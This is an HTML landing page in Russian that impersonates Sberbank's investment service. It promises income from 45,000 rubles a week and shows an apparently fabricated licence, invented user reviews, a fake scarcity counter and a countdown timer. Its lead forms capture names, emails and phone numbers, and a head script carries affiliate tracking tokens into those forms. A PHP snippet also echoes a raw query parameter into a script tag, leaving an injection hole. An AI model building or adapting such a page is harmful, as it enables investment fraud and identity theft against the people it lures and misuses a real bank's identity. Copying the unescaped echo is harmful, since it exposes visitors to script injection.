<!DOCTYPE html>
<html lang="ru">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
    <title>SberBank Invest</title>
    <link href="images/favicon.ico" rel="shortcut icon">
    <meta name="format-detection" content="telephone=no">
    <meta name="description" content="СберИнвестиции: понятные инвестиции со СберБанком. Десятки проверенных инструментов для вашего заработка">
    <link rel="stylesheet" href="css/app.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/RetailContentCommon.css">
    <link rel="stylesheet" href="css/LastSeen.css">
    <link rel="stylesheet" href="css/AccordionContainer.css">
    <link rel="stylesheet" href="css/InvestServerQR.css">
    <link rel="stylesheet" href="css/investmainpage.css">
    <link rel="stylesheet" href="css/SiteFooter.css">
    <link rel="stylesheet" href="css/usercount.css">
    <link rel="stylesheet" href="css/form.css">
    <link rel="stylesheet" href="css/intlTelInput.min.css" />
    <link rel="stylesheet" href="css/timer.css" />
    <link rel="stylesheet" href="css/modal.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css" />
    <link rel="stylesheet" href="css/style.css">

    <!-- JS adapter -->
    <script type="application/javascript">
        function getCookie(name) {
            var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
            return v ? v[2] : null;
        }

        function setCookie(name, value, days) {
            var d = new Date();
            d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
            document.cookie = name + '=' + value + ';path=/;expires=' + d.toGMTString();
        }

        function getSubId() {
            var params = new URLSearchParams(document.location.search.substr(1));
            if (!'{subid}'.match('{')) {
                return '{subid}';
            }
            var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
            if (clientSubid && !clientSubid.match('>')) {
                return clientSubid;
            }
            if (params.get('_subid')) {
                return params.get('_subid');
            }
            if (params.get('subid')) {
                return params.get('subid');
            }
            if (getCookie('subid')) {
                return getCookie('subid');
            }
        }

        function getToken() {
            var params = new URLSearchParams(document.location.search.substr(1));
            if (!'{token}'.match('{')) {
                return '{token}';
            }
            var clientToken = '<?php echo isset($client) ? $client->getToken() : "" ?>';
            if (clientToken && !clientToken.match('>')) {
                return clientToken;
            }
            if (params.get('_token')) {
                return params.get('_token');
            }
            if (params.get('token')) {
                return params.get('token');
            }
            if (getCookie('token')) {
                return getCookie('token');
            }
            return null;
        }

        if (typeof URLSearchParams === 'function') {
            document.addEventListener('DOMContentLoaded', function(event) {
                var params = new URLSearchParams(document.location.search.substr(1));
                var subid = getSubId();
                var token = getToken();

                params.set('_token', token);
                setCookie('token', token);
                setCookie('subid', subid);

                // Adds params as hidden inputs to the forms
                document.querySelectorAll('form').forEach(function(form) {
                    params.forEach(function(v, k) {
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = k;
                        input.value = v;

                        form.append(input);
                    });
                });
            });
        }
    </script>
    <!-- End JS adapter -->

    <script async src="https://api.imotech.video/ad/events.js?pixel_id=<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>">
    </script>
    <script>
        window.bgdataLayer = window.bgdataLayer || [];

        function bge() {
            bgdataLayer.push(arguments);
        }
        bge('init', "<?php echo (isset($_GET['idpxl'])) ? $_GET['idpxl'] : ''; ?>");
    </script>
</head>

<body class="ru  bd-bdDrop notranslate optimize-hide ">

    <div id="main-page" data-pid="page_1583399207242" class="bp-area --area pageContainer">
        <div class="site-header">
            <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/soyServicesQuery">
                <div class="kitt-ecosystem">
                    <div class="kitt-ecosystem__gradient"><img class=" ls-is-cached lazyloaded" src="images/gradient.svg" alt="Экосистема Сбера" role="presentation" aria-hidden="true">
                    </div>
                    <style>
                        .kitt-header__logo {
                            margin-left: 0 !important;
                        }

                        .kitt-header-search__form_opened {
                            left: 30px !important;
                        }
                    </style>
                </div>
            </div>
            <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/soyServicesQuery">
                <header class="kitt-header">
                    <div class="kitt-content"><a class="kitt-header__logo" data-cga_click_logo="/ru/person" href="http://www.sberbank.ru/ru/person" aria-label="Официальный сайт Сбербанка России"><img class="header__logo-image" alt="Официальный сайт Сбербанка России" decoding="async" src="images/logo.svg"></a>
                    </div>
                    <div>
                        <div class="user-count">
                            <div class="space-wrapper">
                                <span class="label">Осталось мест: </span>
                                <span class="free-space" id="freeSpace"></span>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
        </div>
        <div class="bp-container bp-ui-dragRoot bp-manageableArea --area bp-area" data-pid="container_edf44f3e-2004-4bc7-a30f-77c21885db0c" role="main" id="page-main">
            <div data-pid="StaticHelper-6244585" class="bp-widget  widget-chrome-none">
                <div g:onload="be.widgets.StaticHelper.start(__WIDGET__)">
                    <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/soy"></div>
                    <div class="static-helper">
                        <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/statichtml">
                            <div id="invest-main-page">
                                <section class="InvestMainPage-header InvestMainPage-header_visible">
                                    <div class="kitt-grid kitt-grid_fixed">
                                        <div class="kitt-row">
                                            <div class="kitt-col InvestMainPage-header__image-col">
                                                <video controls poster="video/poster.jpg" style="border-radius: 20px">
                                                    <source src="video/video.mp4" type="video/mp4">
                                                </video>
                                                <p class="video-text">
                                                    Посмотрите видео, чтобы узнать больше про инвестиционную
                                                    платформу
                                                </p>
                                            </div>
                                            <div class="kitt-col kitt-col_xs_12 InvestMainPage-header__heading-border">
                                                <h1 class="dk-sbol-heading dk-sbol-heading_size_xl InvestMainPage-header__heading">
                                                    Зарабатывай от 45 000 рублей в неделю!
                                                </h1>
                                            </div>
                                            <div class="kitt-col kitt-col_xs_12">
                                                <div class="InvestMainPage-header__labels"><span class="dk-sbol-text dk-sbol-text_size_lg">
                                                        Инвестировать проще, чем кажется. Оставляйте заявку и наш
                                                        финансовый эксперт свяжется с Вами уже сегодня
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>

                                <section class="form-section" style="position: relative;">
                                    <div class="contactForm top_form">
                                        <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/soyServicesQuery">
                                            <div class="kitt-ecosystem">
                                                <div class="kitt-ecosystem__gradient"><img class=" ls-is-cached lazyloaded" src="images/gradient.svg" alt="Экосистема Сбера" role="presentation" aria-hidden="true">
                                                </div>
                                                <style>
                                                    .kitt-header__logo {
                                                        margin-left: 0 !important;
                                                    }

                                                    .kitt-header-search__form_opened {
                                                        left: 30px !important;
                                                    }
                                                </style>
                                            </div>
                                        </div>
                                        <form method="POST" id="leadform" class="register-form contact_form content_inner flex">
                                            <h3 class="form-title" style="text-align: center">
                                                <!-- Зарегистрируйтесь и наш финансовый эксперт свяжется с Вами в
                                                    ближайшее время! -->
                                            </h3>
                                            <div class="input_group input_name">
                                                <input type="text" placeholder="Имя" class="form-control required form-input" name="first_name" id="first_name" required autocomplete="off" />
                                            </div>
                                            <div class="input_group input_last_name">
                                                <input type="text" placeholder="Фамилия" class="form-control required form-input" name="last_name" id="last_name" required autocomplete="off" />
                                            </div>
                                            <div class="input_group input_email">
                                                <input type="email" placeholder="Email" class="form-control required" name="email" id="email" required autocomplete="off" />
                                            </div>
                                            <div class="input_group intl-tel-input">
                                                <input type="tel" id="phone1" name="phone1" placeholder="" autocomplete="off" required="" class="form-control" />
                                                <input type="hidden" id="realPhone" name="realPhone" class="hidden-phone" value="" />
                                                <input type="hidden" id="country" name="country" value="" />
                                            </div>
                                            <div class="input_group">
                                                <button type="submit" class="btn btn-submit btn-get-robot text-uppercase redBtn">
                                                    <span>Оставить заявку</span>
                                                </button>
                                            </div>
                                        </form>

                                        <style>
                                            #leadform h3,
                                            .form-title {
                                                font-size: 18px;
                                                margin: 15px 0;
                                                color: #333;
                                            }

                                            input.form-control {
                                                width: 100%;
                                                margin-bottom: 5px;
                                                padding: 10px;
                                                border-radius: 6px;
                                                border: 1px solid gray;
                                            }

                                            button.redBtn {
                                                text-align: center;
                                                width: 100%;
                                                display: block;
                                                background: #e31e24;
                                                color: #000;
                                                border: 0;
                                                padding: 15px;
                                                border-radius: 7px;
                                                font-weight: 700;
                                                cursor: pointer;
                                                text-transform: uppercase;
                                            }

                                            #heroSection {
                                                border-radius: 0% 100% 40% 40%/0% 0% 10% 10%;
                                            }
                                        </style>
                                    </div>
                                </section>

                                <section id="heroLogos">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-12">
                                                <div class="flex-row">
                                                    <img src="images/logo_mir.png" alt="" class="img-responsive">
                                                    <img src="images/logo_yandex.png" alt="" class="img-responsive">
                                                    <img src="images/logo_qiwi.png" alt="" class="img-responsive">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>

                                <div class="kitt-grid InvestMainPage-products-switch">
                                    <div class="kitt-grid InvestMainPage-products">
                                        <div class="InvestMainPage-products__carousel">
                                            <div class="static-carousel">
                                                <div class="kitt-grid kitt-grid_fixed">
                                                    <div class="kitt-row">
                                                        <div class="kitt-col kitt-col_xs_12">
                                                            <div class="static-carousel__panel static-carousel__panel_left">
                                                                <div class="static-carousel__scroll">
                                                                    <div class="static-carousel__items">
                                                                        <div class="InvestMainPage-products__card InvestMainPage-products__card_index_0">
                                                                            <div class="InvestMainPage-products__card__image">
                                                                                <img src="images/card1.jpeg" alt="Изображение Изображение ноутбука">
                                                                            </div>
                                                                            <div class="InvestMainPage-products__card_info">
                                                                                <div class="InvestMainPage-products__card_info__name">
                                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_md">
                                                                                        Российские<br>акции
                                                                                    </h2>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="InvestMainPage-products__card InvestMainPage-products__card_index_1">
                                                                            <div class="InvestMainPage-products__card__image">
                                                                                <img src="images/card2.jpeg" alt="Изображение Изображение ПИФ">
                                                                            </div>
                                                                            <div class="InvestMainPage-products__card_info">
                                                                                <div class="InvestMainPage-products__card_info__name">
                                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_md">
                                                                                        Облигации
                                                                                    </h2>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="InvestMainPage-products__card InvestMainPage-products__card_index_2">
                                                                            <div class="InvestMainPage-products__card__image">
                                                                                <img src="images/card3.jpeg" alt="Изображение Изображение ИОС">
                                                                            </div>
                                                                            <div class="InvestMainPage-products__card_info">
                                                                                <div class="InvestMainPage-products__card_info__name">
                                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_md">
                                                                                        Биржевые<br>инвестиционные<br>фонды
                                                                                    </h2>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="InvestMainPage-products__card InvestMainPage-products__card_index_3">
                                                                            <div class="InvestMainPage-products__card__image">
                                                                                <img src="images/card4.png" alt="Изображение Изображение СберКарты">
                                                                            </div>
                                                                            <div class="InvestMainPage-products__card_info">
                                                                                <div class="InvestMainPage-products__card_info__name">
                                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_md">
                                                                                        Криптовалютные<br>фонды
                                                                                    </h2>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="kitt-grid kitt-grid_fixed">
                                            <div class="kitt-row">
                                                <div class="kitt-col kitt-col_xs_0 kitt-col_lg_12">
                                                    <div class="InvestMainPage-products__grid">
                                                        <div class="InvestMainPage-products__grid_card InvestMainPage-products__grid_card_index_0">
                                                            <div class="InvestMainPage-products__grid_card__image">
                                                                <img src="images/card1.jpeg" alt="Изображение Изображение ноутбука">
                                                            </div>
                                                            <div class="InvestMainPage-products__grid_card_info">
                                                                <div class="InvestMainPage-products__grid_card_info__name">
                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_sm">
                                                                        Российские<br>акции
                                                                    </h2>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="InvestMainPage-products__grid_card InvestMainPage-products__grid_card_index_1">
                                                            <div class="InvestMainPage-products__grid_card__image">
                                                                <img src="images/card2.jpeg" alt="Изображение Изображение ПИФ">
                                                            </div>
                                                            <div class="InvestMainPage-products__grid_card_info">
                                                                <div class="InvestMainPage-products__grid_card_info__name">
                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_sm">
                                                                        Облигации
                                                                    </h2>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="InvestMainPage-products__grid_card InvestMainPage-products__grid_card_index_2">
                                                            <div class="InvestMainPage-products__grid_card__image">
                                                                <img src="images/card3.jpeg" alt="Изображение Изображение ИОС">
                                                            </div>
                                                            <div class="InvestMainPage-products__grid_card_info">
                                                                <div class="InvestMainPage-products__grid_card_info__name">
                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_sm">
                                                                        Биржевые<br>инвестиционные<br>фонды
                                                                    </h2>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="InvestMainPage-products__grid_card InvestMainPage-products__grid_card_index_3">
                                                            <div class="InvestMainPage-products__grid_card__image">
                                                            </div>
                                                            <div class="InvestMainPage-products__grid_card_info">
                                                                <div class="InvestMainPage-products__grid_card_info__name">
                                                                    <h2 class="dk-sbol-heading dk-sbol-heading_size_sm">
                                                                        Криптовалютные<br>фонды
                                                                    </h2>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <section id="cryptoMedia">
                                    <div class="container">
                                        <h1 class="sectionHeadline text-center">
                                            Лицензия</h1>
                                        <p style="text-align: center; font-size: 1.1em; color: #545454; margin: 0 auto; max-width: 500px; padding: 0 10px;">
                                            Центральный Банк Российской Федерации №045-13980-02000 От 13.12.2019
                                            Профессиональной и биржевой деятельности по ценным бумагам ПАО
                                            "Государственная платформа СберБанк Инвест"
                                        </p>
                                        <div class="fond__inner">
                                            <div class="fond__body">
                                                <div class="fond__left">
                                                    <img src="images/license.jpg" alt="License" />
                                                    <!-- <a href="images/licence.jpg" class="fancybox btn btn-submit btn-get-robot zoomBtn">
                                                     <span>Увеличить фото</span>
                                                  </a> -->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>

                                <section id="userReviews">
                                    <div class="container">
                                        <h1 class="sectionHeadline text-center">Отзывы пользователей, которые уже
                                            заработали</h1>
                                        <div class="reviews-swiper swiper">
                                            <div class="swiper-wrapper">
                                                <div class="col-md-4 col-sm-6 col-xs-12 swiper-slide">
                                                    <div class="user-review">
                                                        <div class="user-profile">
                                                            <div class="user-picture">
                                                                <img src="images/photo1.png" alt="" />
                                                            </div>
                                                            <h2 class="user-name">Екатерина Кузнецова</h2>
                                                        </div>

                                                        <div class="user-quote">
                                                            Технология, лежащая в основе SberBank Invest, является
                                                            новаторской. Она, за очень
                                                            короткое время, обрабатывает огромное количество
                                                            информации, при этом вы все еще
                                                            можете самостоятельно изучать каждую деталь.
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-md-4 col-sm-6 col-xs-12 swiper-slide">
                                                    <div class="user-review">
                                                        <div class="user-profile">
                                                            <div class="user-picture">
                                                                <img src="images/photo2.png" alt="" />
                                                            </div>
                                                            <h2 class="user-name">Ольга Петрова</h2>
                                                        </div>

                                                        <div class="user-quote">
                                                            SberBank Invest безумно прост в использовании, а
                                                            бесплатные советы экспертов о
                                                            том, как заработать больше, помогают мне сейчас
                                                            зарабатывать более 250 000 рублей.
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-md-4 col-sm-6 col-xs-12 swiper-slide">
                                                    <div class="user-review">
                                                        <div class="user-profile">
                                                            <div class="user-picture">
                                                                <img src="images/photo3.png" alt="" />
                                                            </div>
                                                            <h2 class="user-name">Александр Иванов</h2>
                                                        </div>

                                                        <div class="user-quote">
                                                            Самое невероятное открытие, которое я когда-либо делал.
                                                            Это буквально приносит мне
                                                            деньги каждый день, и мне не нужно ничего для этого
                                                            делать!
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-md-4 col-sm-6 col-xs-12 swiper-slide">
                                                    <div class="user-review">
                                                        <div class="user-profile">
                                                            <div class="user-picture">
                                                                <img src="images/photo4.png" alt="" />
                                                            </div>
                                                            <h2 class="user-name">Дмитрий Смирнов</h2>
                                                        </div>

                                                        <div class="user-quote">
                                                            Когда у меня наконец появилась возможность
                                                            зарегистрироваться, я сразу же
                                                            зарегистрировался. В тот первый день я заработал более
                                                            20 000 рублей!
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="swiper-dots"></div>
                                        </div>
                                    </div>
                                </section>

                                <section id="calculator">
                                    <div class="container">
                                        <h1 class="sectionHeadline text-center">Калькулятор прибыли</h1>
                                        <div class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full" style="margin: 0 auto;">
                                            <form action="javascript:void(0)" class="block bg-white text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-2 sm:leading-tight">
                                                <!-- <h3 class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10"
                                                    style="color: #efb43f">
                                                    Сколько я заработаю?
                                                </h3> -->
                                                <div class="flex flex-col text-center font-bold mb-4 sm:mb-10 px-5">
                                                    <label class="block text-center font-bold mb-4 text-xl" style="color: #148F2A">Ваша инвестиция</label>
                                                    <input type="text" class="js-range-slider" name="my_range" value="150" tabindex="-1" readonly="">
                                                </div>
                                                <div class="flex flex-col">
                                                    <label class="block text-center font-bold text-xl" style="color: #148F2A">Ваша прибыль</label>
                                                    <h3 class="text-2xl text-center font-bol148F2Ad font-ubuntu mt-5" id="calcResult" style="color: #148F2A">
                                                        12000 руб.</h3>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </section>

                                <section class="polygon">
                                    <div class="t-container index-z">
                                        <div class="t-width t-width_12 t415__mainblock">
                                            <div class="t-cover__wrapper t-valign_middle">
                                                <div class="t415__content" data-hook-content="covercontent">
                                                    <img class="" data-tu-max-width="800" data-tu-max-height="800" style="max-width: 250px; margin: 20px auto;" src="./images/logo.svg" imgfield="img2" data-hook-clogo="coverlogo" />
                                                    <div class="t415__textwrapper t-width t-width_12">
                                                        <div class="t415__title t-title t-title_md" field="title">
                                                            Количество пользователей платформы лимитировано
                                                        </div>
                                                        <div class="t415__descr t-descr t-descr_md" field="descr">
                                                            Успейте зарегистрироваться и начать зарабатывать на выгодных
                                                            инвестициях.
                                                            <br />
                                                            До закрытия регистрации осталось...
                                                        </div>
                                                    </div>
                                                    <div id="t415__timer210558841" class="t415__timer">
                                                        <div class="t415__col">
                                                            <span class="t415__days t-title t-title_lg t415__number"> 0
                                                            </span>
                                                            <div class="t415__text t-descr t-descr_xxs">Дней</div>
                                                        </div>
                                                        <div class="t415__col">
                                                            <span class="t415__hours t-title t-title_lg t415__number" id="hours">14</span>
                                                            <div class="t415__text t-descr t-descr_xxs">Часов</div>
                                                        </div>
                                                        <div class="t415__col">
                                                            <span class="t415__minutes t-title t-title_lg t415__number" id="minutes">45</span>
                                                            <div class="t415__text t-descr t-descr_xxs">Минут</div>
                                                        </div>
                                                        <div class="t415__col">
                                                            <span class="t415__seconds t-title t-title_lg t415__number" id="seconds">1</span>
                                                            <div class="t415__text t-descr t-descr_xxs">Секунд</div>
                                                        </div>
                                                    </div>

                                                    <style>
                                                        .form-wrap {
                                                            margin-top: 25px;
                                                        }
                                                    </style>
                                                    <div class="hero-form">
                                                        <div class="contactForm top_form form-wrap">
                                                            <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/soyServicesQuery">
                                                                <div class="kitt-ecosystem">
                                                                    <div class="kitt-ecosystem__gradient"><img class=" ls-is-cached lazyloaded" src="images/gradient.svg" alt="Экосистема Сбера" role="presentation" aria-hidden="true">
                                                                    </div>
                                                                    <style>
                                                                        .kitt-header__logo {
                                                                            margin-left: 0 !important;
                                                                        }

                                                                        .kitt-header-search__form_opened {
                                                                            left: 30px !important;
                                                                        }
                                                                    </style>
                                                                </div>
                                                            </div>
                                                            <form method="POST" id="leadformModal" class="register-form contact_form content_inner flex">
                                                                <h3 class="form-title">
                                                                    <!-- Зарегистрируйтесь и наш финансовый эксперт свяжется
                                                                    с Вами в ближайшее время! -->
                                                                </h3>
                                                                <div class="input_group input_name">
                                                                    <input type="text" placeholder="Имя" class="form-control required form-input" name="first_name" id="first_name" required autocomplete="off" />
                                                                </div>
                                                                <div class="input_group input_last_name">
                                                                    <input type="text" placeholder="Фамилия" class="form-control required form-input" name="last_name" id="last_name" required autocomplete="off" />
                                                                </div>
                                                                <div class="input_group input_email">
                                                                    <input type="email" placeholder="Email" class="form-control required" name="email" id="email" required autocomplete="off" />
                                                                </div>
                                                                <div class="input_group intl-tel-input">
                                                                    <input type="tel" id="phoneModal" name="phoneModal" placeholder="" autocomplete="off" required="" class="form-control" />
                                                                    <input type="hidden" id="realPhone" name="realPhone" class="hidden-phone" value="" />
                                                                    <input type="hidden" id="country" name="country" value="" />
                                                                </div>
                                                                <div class="input_group">
                                                                    <button type="submit" class="btn btn-submit btn-get-robot text-uppercase redBtn">
                                                                        <span>Оставить заявку</span>
                                                                    </button>
                                                                </div>
                                                            </form>

                                                            <style>
                                                                .form-title {
                                                                    font-size: 18px;
                                                                    margin: 15px 0;
                                                                    color: #333;
                                                                }

                                                                input.form-control {
                                                                    width: 100%;
                                                                    margin-bottom: 5px;
                                                                    padding: 10px;
                                                                    border-radius: 6px;
                                                                    border: 1px solid gray;
                                                                }

                                                                button.redBtn {
                                                                    text-align: center;
                                                                    width: 100%;
                                                                    display: block;
                                                                    background: #e31e24;
                                                                    color: #000;
                                                                    border: 0;
                                                                    padding: 15px;
                                                                    border-radius: 7px;
                                                                    font-weight: 700;
                                                                    cursor: pointer;
                                                                    text-transform: uppercase;
                                                                }

                                                                #heroSection {
                                                                    border-radius: 0% 100% 40% 40%/0% 0% 10% 10%;
                                                                }
                                                            </style>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div data-pid="SiteFooter-5058887" class="bp-widget  widget-chrome-none">
            <div class="site-footer">
                <footer class="kitt-footer kitt-footer_googleplay">
                    <div class="kitt-content kitt-footer_phones">
                        <div class="kitt-footer__main">
                            <div class="kitt-footer__block kitt-footer__content kitt-footer__sep kitt-footer__sep_md">
                                <div class="kitt-footer-info">
                                    <img src="images/logo.svg" style="width: 170px; margin: 10px auto;" alt="">
                                    <p>Россия, Москва, 117997, ул. Вавилова, 19</p>
                                    <p>© 1997—2023&nbsp;ПАО Сбербанк.</p>
                                    <p></p>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
    </div>

    <!-- Start popup double -->
    <div class="modal-form" id="modalFailure">
        <p class="close-modal" href="#">&times;</p>
        <div class="content">
            <div class="sign-up-form-header text-center">
                <h5 class="mb-2 mt-4">
                    Вы уже зарегистрировались на данный номер. Если вам нужен новый аккаунт, пройдите
                    регистрацию на другой мобильный номер
                </h5>
            </div>
        </div>
    </div>

    <div class="modal-form" id="modalFailureEmail">
        <p class="close-modal" href="#">&times;</p>
        <div class="content">
            <div class="sign-up-form-header text-center">
                <h5 class="mb-2 mt-4">
                    Вы уже зарегистрировались на данную электронную почту. Если вам нужен новый аккаунт,
                    пройдите регистрацию на другую электронную почту.
                </h5>
            </div>
        </div>
    </div>

    <div class="modal-form" id="modalInvalid">
        <p class="close-modal" href="#">&times;</p>
        <div class="content">
            <div class="sign-up-form-header text-center">
                <h5 class="mb-2 mt-4">
                    Вы ввели неккоректную электронную почту. Пройдите регистрацию на другую электронную
                    почту.
                </h5>
            </div>
        </div>
    </div>
    <!-- End popup double -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
    <script src="js/userCount.js"></script>
    <script src="js/ion.rangeSlider.min.js"></script>
    <script src="js/script.js"></script>
    <script src="js/jquery.validate.js"></script>
    <script src="js/intlTelInput.min.js"></script>
    <script src="js/jquery.maskedinput.js"></script>
    <script src="js/modal.js"></script>
    <script src="js/main.js"></script>
    <script src="js/submitForm.js"></script>
    <script src="js/utm.js"></script>
    <script src="js/timer.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script>
    <script>
        var swiper = new Swiper('.reviews-swiper', {
            slidesPerView: 1,
            centeredSlides: true,
            pagination: {
                el: '.swiper-dots',
                clickable: true,
            },
        });
        var swiper2 = new Swiper('.card-swiper', {
            slidesPerView: 1,
            centeredSlides: true,
            pagination: {
                el: '.swiper-dots',
                clickable: true,
            },
        });
    </script>
</body>

</html>